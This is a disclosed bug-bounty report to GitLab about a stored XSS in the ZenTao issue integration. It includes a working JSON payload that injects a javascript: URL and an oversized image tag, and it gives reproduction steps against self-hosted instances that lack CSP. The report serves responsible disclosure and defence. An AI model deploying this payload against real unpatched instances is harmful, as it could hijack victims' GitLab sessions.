# XSS in ZenTao integration affecting self hosted instances without strict CSP

## Report Details
- **Report ID**: 1542510
- **URL**: https://hackerone.com/reports/1542510
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-04-16T10:00:28.285Z
- **Disclosed**: 2022-09-22T09:10:59.040Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

The ZenTao issue integration (premium feature) is susceptible to an XSS attack by delivering modified API responses to GitLab.

This is related and similar to my report https://hackerone.com/reports/1533976 but this time affecting the ZenTao integration.

A user can create a project and configure ZenTao to be used as an external issue tracker. [ducumentation](https://docs.gitlab.com/ee/user/project/integrations/zentao.html). If this is done on a `premium` instance the integration will add an `issue list` to the project displaying ZenTao issues, and clicking one of these issues will display issue details for a single ZenTao issue. The URL for a single issue looks like

https://gitlab.example.com/GROUP/PROJECT/-/integrations/zentao/issues/story-1

Visiting this page will trigger the GitLab backend to make an API request to the configured ZenTao instance like this

https://zentao.example.net/api.php/v1/issues/story-1

and the response from such a request looks like

```json
{
    "issue": {
        "id": "story-1",
        "title": "story",
        "labels": [ ],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "admin",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://jihudemo.zentao.net/index.php?m=user&f=profile&userID=1"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "admin",
        "status": "opened",
        "url": "https://jihudemo.zentao.net/index.php?m=story&f=view&storyID=32",
        "desc": "",
        "assignedTo": [],
        "comments": [ ]
    }
}
```
 This response is serialized by [ee/app/serializers/integrations/zentao_serializers/issue_entity.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/zentao_serializers/issue_entity.rb)

The interesting part of this file is

```ruby
     expose :web_url do |item|
        item['url']
      end
```

and also 

```ruby
      expose :id do |item|
        sanitize(item['id'])
      end
```

The `:web_url` does not check for correctness of the URL and can thus be given a JavaScript URL such as `javascript:alert(document.domain)`. The `:id` is sanitized by ruby sanitizer, but is not HTML encoded. This will open up a "safe" HTML injection, which we can use to make the attack easier to pull of.

When viewing a ZenTao issue details page the `:web_url` and `:id` is used to create the last part of the breadcrumb links. By adding this to our API response

```json
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

The details page will now display a giant image that on click will trigger the XSS.

Here I use an image tag just to prove that the injection. The `:id` HTML injection can be customized to have the victim more prone to clicking the link.

Infected page:
{F1695165}

Popup:
{F1695164}

### Steps to reproduce

Using my hosted server (see example further down for self hosting the attack):
1. Log in with a user on a self hosted GitLab instance with premium subscription (call the user `user1`)
2. Create a new project, call it `project1`
3. Go to https://gitlab.example.com/user1/project1/-/integrations/zentao/edit
4. Fill in the form. Put `https://joaxcar.com` in the server field. Leave the API field empty, add anything in the username and password.
5. Go to
https://gitlab.example.com/user1/project1/-/integrations/zentao/issues/story-1
6. Click the big white square
7. XSS triggered

To self host the API make sure to host a server that will deliver this payload with a `application/json` response to calls to `/api.php/v1/issues/story-1`

payload
```json
{
    "issue": {
        "id": "<img src=# height=10000 width=10000>",
        "title": "Attack",
        "labels": [],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "asd",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://example.com"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "asd",
        "status": "asd",
        "url": "javascript:alert(document.domain)",
        "desc": "description",
        "assignedTo": [],
        "comments": []
    }
}
```

### Impact

Full XSS on self hosted GitLab instances. A victim needs to visit the infected page and made to click a special link (can be made easy to click)

### What is the current *bug* behavior?

ZenTao issue URLs are not sanitized

### What is the expected *correct* behavior?

Javasript URLs should be filtered

### CSP
This attack does not work on GitLab.com as the CSP rules block any JavaScript URL. I don't know of any bypass to this. But it does affect self-hosted instances that have not configured CSP. I calculated my CVSS score as per attacking a self-hosted instance. GitLab team can modify this according to your current treatment of these issues!

### Ruby sanitation
The ZenTao issues uses a lot of `ruby sanatize` sanitization. This is strict enough to prevent any serious code injection but still allows for some HTML tags to be included where they are supposed not to be. Like in ID in this issue.

Best regards
Johan

## Impact

Full XSS on self hosted GitLab instances. A victim needs to visit the infected page and made to click a special link (can be made easy to click)

## Attachments
- popup.jpg
- link.jpg
